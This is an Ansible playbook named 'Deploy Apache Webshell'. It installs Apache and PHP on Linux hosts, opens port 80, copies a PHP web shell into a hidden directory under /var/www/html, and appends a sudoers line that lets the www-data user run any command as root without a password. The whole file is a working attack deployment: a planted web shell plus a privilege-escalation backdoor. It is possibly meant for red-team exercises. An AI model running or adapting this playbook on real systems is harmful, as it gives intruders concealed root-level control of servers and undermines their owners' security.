---
-   name: Deploy Apache Webshell
    hosts: linux
    gather_facts: false
    become: true

    tasks:
      - name: Open port 80 in UFW
        community.general.ufw:
          rule: allow
          port: '80'
          proto: tcp
        ignore_errors: yes

      - name: Install apache if not installed
        ansible.builtin.apt:
          name: apache2
          state: present
          update_cache: true

      - name: Install PHP
        ansible.builtin.apt:
          name: php
          state: present
     
      - name: make target directory on linux host
        ansible.builtin.file:
          path: /var/www/html/.apache-site
          state: directory

      - name: Move PHP tool into Apache Directory
        ansible.builtin.copy:
          src: /BikiniBottom-Webshell/BikiniBottom.php
          dest: /var/www/html/.apache-site/

      - name: Move image into Apache Directory
        ansible.builtin.copy:
          src: /BikiniBottom-Webshell/spongebob.jpg
          dest: /var/www/html/.apache-site/

      - name: Allow www-data user to run any commands as any user
        ansible.builtin.lineinfile:
          path: /etc/sudoers
          line: 'www-data ALL=(ALL) NOPASSWD:ALL'
